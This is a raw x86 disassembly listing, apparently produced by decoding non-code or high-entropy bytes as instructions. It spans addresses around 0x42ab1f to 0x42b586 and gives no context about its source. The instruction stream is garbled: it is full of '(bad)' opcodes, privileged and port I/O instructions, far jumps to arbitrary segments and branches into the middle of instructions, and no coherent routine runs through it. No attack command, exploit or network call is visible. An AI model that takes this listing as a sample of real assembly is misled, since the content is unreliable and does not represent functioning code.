  42ab1f:	int    0xec
  42ab21:	dec    edx
  42ab22:	int3   
  42ab23:	loopne 0x42ab1f
  42ab25:	stos   BYTE PTR es:[edi],al
  42ab26:	lods   al,BYTE PTR ds:[esi]
  42ab27:	sbb    eax,0x9c159ca9
  42ab2c:	(bad)  
  42ab2d:	pop    esi
  42ab2e:	or     bh,BYTE PTR [edx]
  42ab30:	test   BYTE PTR [esi],ch
  42ab32:	test   BYTE PTR [edi-0x6be38d7c],bh
  42ab38:	sbb    BYTE PTR [edi+edi*2-0x44],dh
  42ab3c:	jl     0x42ab83
  42ab3e:	xor    BYTE PTR ds:0x7185,dh
	...
  42abb4:	mov    ds:0xb788a616,eax
  42abb9:	mov    eax,0x50433faf
  42abbe:	es inc esp
  42abc0:	shr    BYTE PTR [edi+edi*2+0x1c57225],cl
  42abc7:	add    dh,dh
  42abc9:	add    BYTE PTR [eax],al
  42abcb:	add    BYTE PTR [eax],al
  42abcd:	les    ebp,FWORD PTR [ebx]
  42abcf:	outs   dx,BYTE PTR ds:[esi]
  42abd0:	lock push ds
  42abd2:	inc    esi
  42abd3:	and    DWORD PTR [ebx*2-0x4858cee0],0xf2efbb92
  42abde:	and    eax,0x41d02e47
  42abe3:	dec    esp
  42abe4:	fwait
  42abe5:	pop    esp
  42abe6:	sahf   
  42abe7:	shr    DWORD PTR [ebp-0x45],0x29
  42abeb:	cs (bad) 
  42abed:	jno    0x42ac4b
  42abef:	rcr    DWORD PTR [eax+0x30510fdb],1
  42abf5:	mov    eax,ds:0x83cd3d
  42abfa:	ret    
  42abfb:	in     eax,dx
  42abfc:	shl    DWORD PTR [ebp+0x17ad283a],1
  42ac02:	add    dh,ah
  42ac04:	add    edi,DWORD PTR [ebp+0x7b822e75]
  42ac0a:	jmp    0x7f72:0x84ff432c
  42ac11:	nop
  42ac12:	enter  0xcc50,0xbb
  42ac16:	mov    ah,0x7f
  42ac18:	mov    ch,0x4a
  42ac1a:	mov    ecx,DWORD PTR [edi-0x5971bd9a]
  42ac20:	sub    eax,0xc3c48234
  42ac25:	call   0x54eb:0xbec8a4df
  42ac2c:	push   edi
  42ac2d:	cli    
  42ac2e:	xchg   esp,eax
  42ac2f:	adc    eax,0x66d443ed
  42ac34:	aaa    
  42ac35:	and    DWORD PTR [edi],ebp
  42ac37:	pop    edi
  42ac38:	mov    ecx,0x7d758614
  42ac3d:	dec    esi
  42ac3e:	cdq    
  42ac3f:	dec    ebx
  42ac40:	sti    
  42ac41:	js     0x42abdf
  42ac43:	sbb    eax,0xf6fd81b
  42ac48:	push   ecx
  42ac49:	add    eax,DWORD PTR [eax+ebp*8+0x68a74224]
  42ac50:	push   eax
  42ac51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac52:	inc    esp
  42ac53:	xchg   edx,eax
  42ac54:	outs   dx,DWORD PTR ds:[esi]
  42ac55:	fild   DWORD PTR [edi+0x23]
  42ac58:	pop    esi
  42ac59:	jns    0x42ac8a
  42ac5b:	jae    0x42ac0b
  42ac5d:	mov    ebp,0x7ed51c93
  42ac62:	aad    0x29
  42ac64:	inc    ecx
  42ac65:	lahf   
  42ac66:	rcr    ecx,0x37
  42ac69:	mov    DWORD PTR [ecx],esp
  42ac6b:	jmp    0x42ac24
  42ac6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac6e:	mov    ebx,0x1dc04c2e
  42ac73:	shl    BYTE PTR [edx-0x2a],cl
  42ac76:	pop    ss
  42ac77:	popa   
  42ac78:	mov    cl,0xa4
  42ac7b:	aaa    
  42ac7c:	jmp    0xa3dbeb0f
  42ac81:	jo     0x42ac59
  42ac83:	adc    al,0x5
  42ac85:	inc    esp
  42ac86:	sub    BYTE PTR [ebx+0x71],ch
  42ac89:	or     al,0x17
  42ac8b:	add    DWORD PTR [eax],ecx
  42ac8d:	ret    
  42ac8e:	or     BYTE PTR [eax-0x61],dh
  42ac91:	cmp    BYTE PTR [ecx],ch
  42ac93:	push   ss
  42ac94:	ins    DWORD PTR es:[edi],dx
  42ac95:	jmp    FWORD PTR [esi-0x53]
  42ac98:	dec    ecx
  42ac99:	push   edx
  42ac9a:	ins    DWORD PTR es:[edi],dx
  42ac9b:	pop    esp
  42ac9c:	(bad)  [ebx+0x3531953e]
  42aca2:	jl     0x42ad14
  42aca4:	push   0x31
  42aca6:	(bad)  
  42aca7:	fmul   DWORD PTR [ecx]
  42aca9:	cli    
  42acaa:	mov    ecx,0x3f5aba04
  42acaf:	into   
  42acb0:	je     0x42ac65
  42acb2:	inc    edi
  42acb3:	mov    edx,DWORD PTR [ecx]
  42acb5:	mov    bh,0x7a
  42acb7:	fdivr  DWORD PTR [edx]
  42acb9:	mov    cl,0xdd
  42acbb:	mov    ebx,DWORD PTR ds:0x9da5256b
  42acc1:	das    
	...
  42ad32:	add    BYTE PTR [eax],al
  42ad34:	fwait
  42ad35:	mov    bh,0xc4
  42ad37:	or     al,0xec
  42ad39:	jg     0x42ad16
  42ad3b:	mov    bh,0xb7
  42ad3d:	sub    DWORD PTR [eax],ebx
  42ad3f:	invd   
  42ad41:	mov    ch,0x9
  42ad43:	xchg   edi,eax
  42ad44:	push   0xf60001c6
  42ad49:	add    BYTE PTR [eax],al
  42ad4b:	add    BYTE PTR [ecx+eiz*8],bh
  42ad4e:	pop    ss
  42ad4f:	in     al,0x78
  42ad51:	jno    0x42ad42
  42ad53:	xchg   BYTE PTR [eax+0x28a0c7d9],cl
  42ad59:	and    al,0x7
  42ad5b:	add    eax,0x3e6beb1a
  42ad60:	fs adc eax,0xc6dd27f1
  42ad66:	test   eax,0xd4b16b60
  42ad6b:	inc    ebx
  42ad6c:	shr    ebp,1
  42ad6e:	xchg   edi,eax
  42ad6f:	sub    ecx,DWORD PTR [eax+0x45]
  42ad72:	cmp    ch,BYTE PTR [eax]
  42ad74:	leave  
  42ad75:	popa   
  42ad76:	xchg   esi,eax
  42ad77:	xor    ebp,esp
  42ad79:	(bad)  
  42ad7a:	je     0x42ad62
  42ad7c:	dec    eax
  42ad7d:	ret    
  42ad7e:	mov    BYTE PTR [eax-0x33],cl
  42ad81:	sbb    eax,0x616d8a3b
  42ad86:	fistp  QWORD PTR [edi]
  42ad88:	mov    dl,0x4a
  42ad8a:	add    bh,ch
  42ad8c:	or     esi,ecx
  42ad8e:	in     eax,0x4b
  42ad90:	sbb    esi,DWORD PTR [ecx]
  42ad92:	push   esp
  42ad93:	xor    ebp,DWORD PTR [ebx-0x9]
  42ad96:	or     DWORD PTR [edx+0x72e7ad72],edi
  42ad9c:	jno    0x42ad29
  42ad9e:	push   edi
  42ad9f:	push   cs
  42ada0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ada1:	add    esp,eax
  42ada3:	ins    DWORD PTR es:[edi],dx
  42ada4:	mov    dl,0xef
  42ada6:	jp     0x42adb5
  42ada8:	pop    ds
  42ada9:	jno    0x42ad32
  42adab:	inc    edi
  42adac:	add    ch,dl
  42adae:	sub    dl,BYTE PTR [edx+0x1b]
  42adb1:	rcl    DWORD PTR [ecx],cl
  42adb3:	retf   
  42adb4:	pop    ss
  42adb5:	push   ss
  42adb6:	pop    ebx
  42adb7:	pusha  
  42adb8:	cmp    eax,0x70061bdd
  42adbd:	mov    BYTE PTR [edx+0x36],cl
  42adc0:	and    bh,dl
  42adc2:	mov    dh,0x7a
  42adc4:	cmp    al,0xed
  42adc6:	jl     0x42add4
  42adc8:	jae    0x42ad7c
  42adca:	aad    0x54
  42adcc:	and    eax,0xd5006499
  42add1:	cs (bad) 
  42add3:	fst    QWORD PTR [eax-0x72]
  42add6:	sub    BYTE PTR [ebx+0x6b1154eb],al
  42addc:	(bad)  
  42addd:	dec    edx
  42adde:	mov    ?,WORD PTR [edx]
  42ade0:	test   DWORD PTR [eax-0x7e],esi
  42ade3:	adc    al,0x17
  42ade5:	pop    eax
  42ade6:	retf   
  42ade7:	add    DWORD PTR [eax],0xffffffc4
  42adea:	cwde   
  42adeb:	lahf   
  42adec:	push   esp
  42aded:	jae    0x42ad79
  42adef:	repnz sbb edi,DWORD PTR [eax]
  42adf2:	jmp    0x42adef
  42adf4:	push   es
  42adf5:	xor    dh,dh
  42adf7:	mov    ecx,0xcde68614
  42adfc:	loopne 0x42ae78
  42adfe:	pop    edi
  42adff:	fcomp  QWORD PTR [edi+0x14]
  42ae02:	neg    dl
  42ae04:	push   eax
  42ae05:	cmp    DWORD PTR [ebx],0xffffffc9
  42ae08:	jle    0x42ae35
  42ae0a:	push   es
  42ae0b:	sbb    DWORD PTR [edi+0x472deefa],edi
  42ae11:	pop    ecx
  42ae12:	cdq    
  42ae13:	push   0x1b
  42ae15:	fidivr DWORD PTR [edi+ebx*2]
  42ae18:	loopne 0x42ae6d
  42ae1a:	xchg   edx,eax
  42ae1c:	dec    edx
  42ae1d:	lods   eax,DWORD PTR ds:[esi]
  42ae1e:	ja     0x42ae90
  42ae20:	sub    ebp,ebp
  42ae22:	test   ecx,eax
  42ae24:	ins    BYTE PTR es:[edi],dx
  42ae25:	adc    edi,eax
  42ae27:	jle    0x42adb2
  42ae29:	(bad)  
  42ae2a:	hlt    
  42ae2b:	dec    edi
  42ae2c:	xchg   edi,eax
  42ae2d:	push   esi
  42ae2e:	sub    DWORD PTR [edi+0x1e],edi
  42ae31:	test   al,0x55
  42ae33:	mov    eax,0x3b2ba29c
  42ae38:	mov    ds:0x2fee1ac4,al
  42ae3d:	dec    ebx
  42ae3e:	jge    0x42ae24
  42ae40:	outs   dx,DWORD PTR ds:[esi]
  42ae41:	std    
	...
  42aeb2:	add    BYTE PTR [eax],al
  42aeb4:	xor    DWORD PTR [ebp-0x38],eax
  42aeb7:	push   es
  42aeb8:	cld    
  42aeb9:	(bad)  
  42aeba:	push   DWORD PTR [edi+0x59]
  42aebd:	out    dx,eax
  42aebe:	adc    dl,al
  42aec0:	or     eax,0x5ec65554
  42aec5:	mov    DWORD PTR [ecx],0xf600
  42aecb:	add    BYTE PTR [edx+0xe03f9cb],cl
  42aed1:	xor    DWORD PTR ds:0x94bc7ed4,ebx
  42aed7:	bound  esi,QWORD PTR [eax+0x4bdbd9d6]
  42aedd:	stos   DWORD PTR es:[edi],eax
  42aede:	xchg   edx,eax
  42aedf:	xchg   ecx,eax
  42aee0:	(bad)  
  42aee1:	div    DWORD PTR [edi]
  42aee3:	sub    eax,0x5b2a3a12
  42aee8:	inc    ah
  42aeea:	ja     0x42aede
  42aeec:	fnsave [esi+0x3494cca8]
  42aef2:	nop
  42aef3:	rcr    BYTE PTR ds:0x36639e8b,cl
  42aef9:	lock out dx,al
  42aefb:	clc    
  42aefc:	inc    esi
  42aefd:	(bad)  
  42aefe:	(bad)
  42af02:	mov    ch,0x5b
  42af04:	push   esi
  42af05:	push   edi
  42af06:	or     ebp,DWORD PTR [eax+0x5d10c6c2]
  42af0c:	sbb    al,dh
  42af0e:	lods   eax,DWORD PTR ds:[esi]
  42af0f:	leave  
  42af10:	mov    al,0x18
  42af12:	sahf   
  42af13:	mov    dl,0xdc
  42af15:	or     eax,0xbf11e1c
  42af1a:	es (bad) 
  42af1c:	jge    0x42af90
  42af1e:	dec    esi
  42af1f:	icebp  
  42af20:	pop    esp
  42af21:	jge    0x42af7f
  42af23:	daa    
  42af24:	imul   ecx,DWORD PTR [ebp+0x32e3baeb],0xbe2db265
  42af2e:	leave  
  42af2f:	fst    st(2)
  42af31:	pop    ecx
  42af32:	and    eax,DWORD PTR [edi-0x7c]
  42af35:	cmp    DWORD PTR [ebx+0x31],eax
  42af38:	mov    ch,0x5a
  42af3a:	jo     0x42af3b
  42af3c:	xchg   ecx,eax
  42af3d:	pop    esi
  42af3e:	(bad)  
  42af40:	sbb    edx,ebx
  42af42:	xadd   DWORD PTR [ebx+0x9],ebp
  42af46:	pop    esp
  42af47:	and    eax,edx
  42af49:	js     0x42af97
  42af4b:	(bad)  
  42af4c:	push   ss
  42af4d:	xchg   esp,eax
  42af4e:	loop   0x42af16
  42af50:	sbb    ah,BYTE PTR [ebp+0x39e5168c]
  42af56:	sbb    al,0xcb
  42af58:	mov    edx,0xd4479e44
  42af5d:	push   esp
  42af5e:	cmp    eax,0x58333a3
  42af63:	clc    
  42af64:	mov    ?,WORD PTR [edi+eiz*8-0x6951c30d]
  42af6b:	pop    es
  42af6c:	cvtps2pd xmm1,xmm5
  42af6f:	call   0x4140c1b0
  42af74:	xor    ah,BYTE PTR [ebx]
  42af76:	inc    eax
  42af77:	mov    bh,dl
  42af79:	clc    
  42af7a:	xchg   ecx,eax
  42af7b:	or     dl,BYTE PTR [eax+0x6f]
  42af7e:	test   al,0x79
  42af80:	jns    0x42afab
  42af82:	int3   
  42af83:	(bad)  
  42af84:	jmp    0x7751:0x12f5d0a1
  42af8b:	daa    
  42af8c:	mov    esp,DWORD PTR [eax-0x41]
  42af8f:	mov    bh,0xfb
  42af91:	mov    bl,0xad
  42af93:	mul    BYTE PTR [esi-0x1374bcc0]
  42af99:	push   esi
  42af9a:	or     bh,ah
  42af9c:	js     0x42b00b
  42af9e:	jp     0x42b01c
  42afa0:	mov    eax,0xa80cde10
  42afa5:	test   eax,0xcf0b1e36
  42afaa:	xchg   esi,eax
  42afab:	les    ecx,FWORD PTR [ecx]
  42afad:	and    esi,DWORD PTR [esi+0x50]
  42afb0:	fisubr WORD PTR [esi]
  42afb2:	pushf  
  42afb3:	jbe    0x42af4c
  42afb5:	xor    al,BYTE PTR [edx+esi*8]
  42afb8:	loope  0x42afcd
  42afba:	sbb    edi,DWORD PTR ds:0x99cb051a
  42afc0:	dec    esp
  42afc1:	add    al,BYTE PTR [eax]
	...
  42b033:	add    bh,dl
  42b035:	pushf  
  42b036:	shr    BYTE PTR [ebp-0x1000235],0x4c
  42b03d:	jb     0x42b001
  42b03f:	ret    0x2870
  42b042:	ds stc 
  42b044:	push   esp
  42b045:	enter  0x1,0xf6
  42b049:	add    BYTE PTR [eax],al
  42b04b:	add    bl,dh
  42b04d:	dec    esi
  42b04e:	jp     0x42b039
  42b050:	(bad)  [eax+0x51]
  42b053:	enter  0x5629,0x53
  42b057:	aas    
  42b058:	loop   0x42b09a
  42b05a:	jne    0x42b0c1
  42b05c:	cld    
  42b05d:	push   eax
  42b05e:	pop    ds
  42b05f:	inc    ecx
  42b060:	mov    ds:0xe930f4ed,al
  42b065:	push   ds
  42b066:	sbb    DWORD PTR [eax],eax
  42b068:	dec    ebp
  42b069:	mov    ebp,0x85c26436
  42b06e:	xor    eax,0xcf1fd3c0
  42b073:	outs   dx,BYTE PTR ds:[esi]
  42b074:	mov    ebx,0xf1890ca1
  42b079:	inc    edi
  42b07a:	inc    eax
  42b07b:	mov    edx,0xa2d586b4
  42b080:	ja     0x42b08c
  42b082:	fist   WORD PTR ds:0x219c48
  42b088:	or     ebp,esi
  42b08a:	push   esi
  42b08b:	aas    
  42b08c:	sub    DWORD PTR [eax+0xeb134c2],0xffffffc2
  42b093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b094:	test   DWORD PTR [esi-0x76],ebp
  42b097:	popa   
  42b098:	aaa    
  42b099:	xor    bl,cl
  42b09b:	popf   
  42b09c:	aam    0xb0
  42b09e:	cmp    al,0x5d
  42b0a0:	cmp    BYTE PTR [edi],bl
  42b0a2:	or     bl,al
  42b0a4:	hlt    
  42b0a5:	out    0x18,al
  42b0a7:	jo     0x42b0a8
  42b0a9:	xor    esp,DWORD PTR [edx]
  42b0ab:	xor    ah,al
  42b0ad:	xor    BYTE PTR [esi+0x5149fdb5],dl
  42b0b3:	stc    
  42b0b4:	mov    dh,0x63
  42b0b6:	leave  
  42b0b7:	push   edx
  42b0b8:	adc    ebx,ecx
  42b0ba:	mov    esp,0xcd4bfaf9
  42b0bf:	jmp    0x42b0cd
  42b0c1:	mov    ebp,0xb92365a1
  42b0c6:	retf   0x5472
  42b0c9:	nop
  42b0ca:	xor    eax,0xffffffd1
  42b0cd:	arpl   ax,cx
  42b0cf:	data16 jmp 0x42b0c9
  42b0d2:	mov    edx,0x5e2950d9
  42b0d7:	xor    al,BYTE PTR [eax-0x34]
  42b0da:	xchg   edx,eax
  42b0db:	repz adc BYTE PTR [edi],ah
  42b0de:	ja     0x42b10d
  42b0e0:	daa    
  42b0e1:	jo     0x42b09b
  42b0e3:	jmp    0xa0f0:0x546f52c
  42b0ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b0eb:	push   esp
  42b0ec:	inc    esp
  42b0ed:	arpl   WORD PTR [ecx],si
  42b0ef:	fisub  WORD PTR [esp+0x54]
  42b0f3:	call   0xcadc0985
  42b0f8:	shl    DWORD PTR [esp+ecx*2-0x5d],cl
  42b0fc:	enter  0xcbdb,0xa1
  42b100:	and    BYTE PTR [ebx+0x331bf22f],bh
  42b106:	inc    ebx
  42b107:	cmp    al,BYTE PTR [ecx]
  42b109:	push   0xffffffda
  42b10b:	mov    ebp,0xb64e594e
  42b110:	mov    ecx,0x38d37e8
  42b115:	mov    ah,0xf8
  42b117:	inc    edx
  42b118:	adc    BYTE PTR [ecx+ebp*1],dl
  42b11b:	sub    BYTE PTR [esi+ebx*2],cl
  42b11e:	scas   eax,DWORD PTR es:[edi]
  42b11f:	add    ch,dh
  42b121:	test   al,0xcf
  42b123:	stos   DWORD PTR es:[edi],eax
  42b124:	pop    edx
  42b125:	pop    ecx
  42b126:	jno    0x42b19d
  42b128:	mov    bl,0x88
  42b12a:	shl    BYTE PTR [eax+0x4334c4bd],1
  42b130:	cmp    al,0x25
  42b132:	das    
  42b133:	xchg   edx,eax
  42b134:	push   ebx
  42b135:	daa    
  42b136:	lods   al,BYTE PTR ds:[esi]
  42b137:	sub    ch,cl
  42b139:	ror    DWORD PTR [ebx-0x6f],1
  42b13c:	pop    eax
  42b13d:	loop   0x42b17b
  42b13f:	ins    DWORD PTR es:[edi],dx
  42b140:	or     al,ah
	...
  42b1b2:	add    BYTE PTR [eax],al
  42b1b4:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42b1ba:	scas   eax,DWORD PTR es:[edi]
  42b1bb:	mov    bh,0x27
  42b1bd:	xchg   ecx,eax
  42b1be:	push   esp
  42b1bf:	outs   dx,DWORD PTR ds:[esi]
  42b1c0:	in     eax,0x8d
  42b1c2:	push   ss
  42b1c3:	pop    es
  42b1c4:	dec    edx
  42b1c5:	leave  
  42b1c6:	add    DWORD PTR [eax],eax
  42b1c8:	test   BYTE PTR [eax],0x0
  42b1cb:	add    dh,bl
  42b1cd:	push   0x25c62f7f
  42b1d2:	sub    dl,bh
  42b1d4:	js     0x42b1e6
  42b1d6:	sti    
  42b1d7:	fs mov ebp,0x939dd354
  42b1dd:	push   ebp
  42b1de:	xchg   ebp,esp
  42b1e0:	xor    BYTE PTR [edx],ah
  42b1e2:	push   ebx
  42b1e3:	ins    BYTE PTR es:[edi],dx
  42b1e4:	fbstp  TBYTE PTR [eax+eax*8]
  42b1e7:	push   cs
  42b1e8:	stos   BYTE PTR es:[edi],al
  42b1e9:	or     BYTE PTR [ebp+0x73],bh
  42b1ec:	retf   0x5a98
  42b1ef:	dec    edx
  42b1f0:	mov    cl,0xec
  42b1f2:	add    eax,0xed461ce1
  42b1f7:	sti    
  42b1f8:	popfw  
  42b1fa:	mov    ch,0x6a
  42b1fc:	and    eax,0xa060cc23
  42b201:	scas   eax,DWORD PTR es:[edi]
  42b202:	sub    eax,0x3a1e7e7
  42b207:	aad    0xb
  42b209:	sbb    BYTE PTR [ecx+0x65],dh
  42b20c:	pcmpgtd mm1,mm3
  42b20f:	das    
  42b210:	and    eax,0xcfb660c0
  42b215:	inc    ebp
  42b216:	dec    edx
  42b217:	sub    al,BYTE PTR [eax]
  42b219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b21a:	in     al,dx
  42b21b:	cmp    eax,0xeac5d86b
  42b220:	jecxz  0x42b273
  42b222:	mov    bl,0xc8
  42b224:	adc    cl,BYTE PTR [edx+0x492df72a]
  42b22a:	add    esp,DWORD PTR [esi]
  42b22c:	jecxz  0x42b29e
  42b22e:	or     eax,0xc03d8929
  42b233:	ins    DWORD PTR es:[edi],dx
  42b234:	or     dl,BYTE PTR [ecx+0x67]
  42b237:	out    dx,al
  42b238:	push   ecx
  42b239:	fst    DWORD PTR [ebx-0x5d6f8135]
  42b23f:	adc    edi,esp
  42b241:	mov    dl,0x78
  42b243:	lods   eax,DWORD PTR ds:[esi]
  42b244:	ror    dl,cl
  42b246:	inc    ebp
  42b247:	(bad)  
  42b248:	rcr    DWORD PTR [ebp-0x54e6868c],1
  42b24e:	sub    al,0xa
  42b250:	sahf   
  42b251:	push   ebx
  42b252:	aas    
  42b253:	shl    DWORD PTR [ebx],1
  42b255:	xchg   edi,eax
  42b256:	nop    DWORD PTR [eax-0x4d]
  42b25a:	fmul   QWORD PTR fs:0x4b0b7232
  42b261:	ror    DWORD PTR [edx+0x22e67be7],1
  42b267:	aaa    
  42b268:	inc    esi
  42b269:	cld    
  42b26a:	imul   eax,esi,0xf0d11c6e
  42b270:	(bad)  
  42b271:	scas   al,BYTE PTR es:[edi]
  42b272:	gs es mov ebp,0xf31e88f7
  42b279:	dec    esp
  42b27a:	mov    dh,dl
  42b27c:	pop    ebx
  42b27d:	adc    eax,0xf4bcf066
  42b282:	adc    eax,0x7e7fc186
  42b287:	out    0x8f,al
  42b289:	xchg   ecx,eax
  42b28a:	ror    BYTE PTR [esi+ecx*4],0x28
  42b28e:	outs   dx,BYTE PTR ds:[esi]
  42b28f:	sub    BYTE PTR [esi],0x17
  42b292:	push   esp
  42b293:	mov    al,0xe0
  42b295:	fisub  WORD PTR [ecx+0x72]
  42b298:	sub    eax,0x5f759c50
  42b29d:	in     eax,dx
  42b29e:	daa    
  42b29f:	jmp    0xc6ad:0xefe70ed3
  42b2a6:	lds    esi,FWORD PTR ds:0xcc21511e
  42b2ac:	scas   al,BYTE PTR es:[edi]
  42b2ad:	ret    
  42b2ae:	and    bh,BYTE PTR [ecx+0x47]
  42b2b1:	shl    DWORD PTR [ebx+0x5adc8598],0xf7
  42b2b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b2b9:	cmp    bl,BYTE PTR [ecx-0x61]
  42b2bc:	es mov esp,ebx
  42b2bf:	ds inc ecx
  42b2c1:	popf   
	...
  42b332:	add    BYTE PTR [eax],al
  42b334:	jg     0x42b344
  42b336:	jne    0x42b373
  42b338:	jne    0x42b3b5
  42b33a:	jg     0x42b38a
  42b33c:	out    0x79,eax
  42b33e:	and    DWORD PTR [eax-0x2],esi
  42b341:	inc    edi
  42b342:	daa    
  42b343:	sub    eax,DWORD PTR [eax-0x36]
  42b346:	add    DWORD PTR [eax],eax
  42b348:	test   BYTE PTR [eax],0x0
  42b34b:	add    BYTE PTR [eax],ch
  42b34d:	pop    ecx
  42b34e:	xor    al,0x40
  42b351:	inc    ebx
  42b352:	outs   dx,BYTE PTR ds:[esi]
  42b353:	retf   0xc9a6
  42b356:	(bad)  [ecx+ebx*8]
  42b359:	push   0x73
  42b35b:	push   ebp
  42b35c:	sbb    edx,ebp
  42b35e:	mov    ah,0xd2
  42b360:	adc    BYTE PTR [ecx+edx*2],0xd5
  42b364:	fst    st(7)
  42b366:	ds aas 
  42b368:	outs   dx,BYTE PTR ds:[esi]
  42b369:	or     DWORD PTR [edx+0x6802b816],esp
  42b36f:	inc    ebx
  42b370:	ret    0x6e14
  42b373:	popf   
  42b374:	mov    eax,0xf3dc6fc3
  42b379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b37a:	call   0x6f74:0x57a5b37
  42b381:	outs   dx,BYTE PTR ds:[esi]
  42b382:	dec    ebp
  42b383:	loopne 0x42b3a7
  42b385:	pop    ebp
  42b386:	and    BYTE PTR [eax+0x6950941],0x3f
  42b38d:	outs   dx,BYTE PTR ds:[esi]
  42b38e:	jle    0x42b36d
  42b390:	mov    dl,0xb8
  42b392:	outs   dx,DWORD PTR ds:[esi]
  42b393:	cmp    eax,eax
  42b395:	dec    ebx
  42b396:	loopne 0x42b3fd
  42b398:	sbb    cl,BYTE PTR ds:0x8dfd85fc
  42b39e:	xchg   edi,eax
  42b39f:	call   FWORD PTR ss:[edx-0x5f71b1f]
  42b3a6:	outs   dx,DWORD PTR ds:[esi]
  42b3a7:	jle    0x42b406
  42b3a9:	mov    dl,0xc3
  42b3ab:	xor    BYTE PTR [ecx+0x2a27873e],0xd
  42b3b2:	sbb    dh,bl
  42b3b4:	add    cl,al
  42b3b6:	sub    al,0xcf
  42b3b8:	sbb    BYTE PTR [ebp+eiz*1+0x5f2eab2e],ch
  42b3bf:	push   cs
  42b3c0:	aaa    
  42b3c1:	(bad)  
  42b3c3:	int3   
  42b3c4:	ret    
  42b3c5:	push   eax
  42b3c6:	pop    ds
  42b3c7:	outs   dx,DWORD PTR ds:[esi]
  42b3c8:	mov    ds:0x715bac3d,al
  42b3cd:	daa    
  42b3ce:	push   ecx
  42b3cf:	test   BYTE PTR [esi+eiz*4],dl
  42b3d2:	mov    ?,WORD PTR [edi]
  42b3d4:	mov    al,ds:0x49aa1681
  42b3d9:	shl    esp,cl
  42b3db:	sub    DWORD PTR [ebp-0x749aa8a5],ecx
  42b3e1:	les    eax,FWORD PTR [esi+0x7d]
  42b3e4:	mov    eax,0x2af54b5e
  42b3e9:	inc    edi
  42b3ea:	mov    cl,dh
  42b3ec:	xchg   edx,eax
  42b3ed:	pop    ebp
  42b3ee:	xchg   edx,eax
  42b3ef:	nop
  42b3f0:	call   0x45fd77f8
  42b3f5:	adc    ch,BYTE PTR [esi+0x1c050c73]
  42b3fb:	(bad)  
  42b3fc:	repz jmp 0x1131:0xf5d30b9f
  42b404:	pop    ebp
  42b405:	ds pop esp
  42b407:	out    0xe7,al
  42b409:	repz dec esi
  42b40b:	jmp    0x54e:0x5f671b28
  42b412:	cmp    ecx,DWORD PTR [eax-0x598588b5]
  42b418:	sub    ebp,0x727c7eee
  42b41e:	dec    esp
  42b41f:	adc    al,0x60
  42b421:	push   eax
  42b422:	shl    DWORD PTR [ecx+esi*8-0x582338b4],1
  42b429:	stos   DWORD PTR es:[edi],eax
  42b42a:	scas   eax,DWORD PTR es:[edi]
  42b42b:	mov    ds:0x9ca20d5f,al
  42b430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b431:	call   0xa9b1:0x681aaebf
  42b438:	or     esi,DWORD PTR [eax]
  42b43a:	fcomp  DWORD PTR [ecx]
  42b43c:	dec    ebp
  42b43d:	sub    eax,0xe6ac9cac
	...
  42b4b2:	add    BYTE PTR [eax],al
  42b4b4:	sbb    BYTE PTR [edi+0x17],cl
  42b4b7:	mov    ecx,0xefbef957
  42b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4bd:	fstp   QWORD PTR [esi+0x5]
  42b4c0:	push   eax
  42b4c1:	pop    esi
  42b4c2:	add    edi,DWORD PTR [ebp+0x36]
  42b4c5:	retf   
  42b4c6:	add    DWORD PTR [eax],eax
  42b4c8:	test   BYTE PTR [eax],0x0
  42b4cb:	add    BYTE PTR [edi+edi*4],dl
  42b4ce:	cmp    al,0xba
  42b4d0:	mov    edi,0x3d4710a8
  42b4d5:	ret    0x1302
  42b4d8:	mov    bh,BYTE PTR [ecx]
  42b4da:	jle    0x42b4a7
  42b4dc:	jne    0x42b538
  42b4de:	sub    eax,0x2736255b
  42b4e3:	retf   
  42b4e4:	jl     0x42b516
  42b4e6:	dec    esi
  42b4e7:	nop
  42b4e8:	int3   
  42b4e9:	mov    al,0x53
  42b4eb:	cmp    eax,0x99c8e8f6
  42b4f0:	xlat   BYTE PTR ds:[ebx]
  42b4f1:	mov    ds:0xad82b5f8,al
  42b4f6:	lock sub BYTE PTR [ecx-0x2c],dh
  42b4fa:	sbb    BYTE PTR ds:0x6b964c,0x91
  42b501:	imul   edi,DWORD PTR [edx-0x2b84cd4b],0xf
  42b508:	inc    ebx
  42b509:	imul   ecx,eax,0xcfe80c73
  42b50f:	xchg   edi,eax
  42b510:	aaa    
  42b511:	xlat   BYTE PTR ds:[ebx]
  42b512:	mov    ds:0xacfb9c6b,al
  42b517:	fcomp  st(5)
  42b519:	mov    edi,0x277c063b
  42b51e:	mov    esi,0x51436680
  42b523:	jnp    0x42b512
  42b525:	out    0x21,al
  42b527:	mov    edi,0x6332ec82
  42b52c:	mov    ss,WORD PTR [ebp+edi*8-0x10]
  42b530:	cli    
  42b531:	call   FWORD PTR [eax+0x69fc28d]
  42b537:	inc    esi
  42b538:	push   esp
  42b539:	add    ch,BYTE PTR [esi]
  42b53b:	shl    DWORD PTR [esi+0x71],0x1b
  42b53f:	out    dx,al
  42b540:	pop    ds
  42b541:	cs dec esp
  42b543:	push   ds
  42b544:	mov    ds:0x2221ee1a,eax
  42b549:	dec    cx
  42b54b:	adc    al,0x3f
  42b54d:	loopne 0x42b522
  42b54f:	cmp    al,0x1
  42b551:	js     0x42b5bb
  42b553:	inc    BYTE PTR [edx]
  42b555:	jp     0x42b5ca
  42b557:	es inc edx
  42b559:	pop    eax
  42b55a:	dec    esp
  42b55b:	mov    edi,0x69dc7de7
  42b560:	jmp    0xcb3c:0xc00dd782
  42b567:	call   0x1c09:0x74add178
  42b56e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b56f:	push   cs
  42b570:	mov    edi,0x76cc6def
  42b575:	mov    edx,0x9eaab9f6
  42b57a:	cmp    BYTE PTR [edx-0x65],dh
  42b57d:	or     ch,ch
  42b57f:	cwde   
  42b580:	sbb    DWORD PTR [ebx],edx
  42b582:	ror    DWORD PTR [edx],cl
  42b584:	loope  0x42b605
  42b586:	mov    cl,0xb6
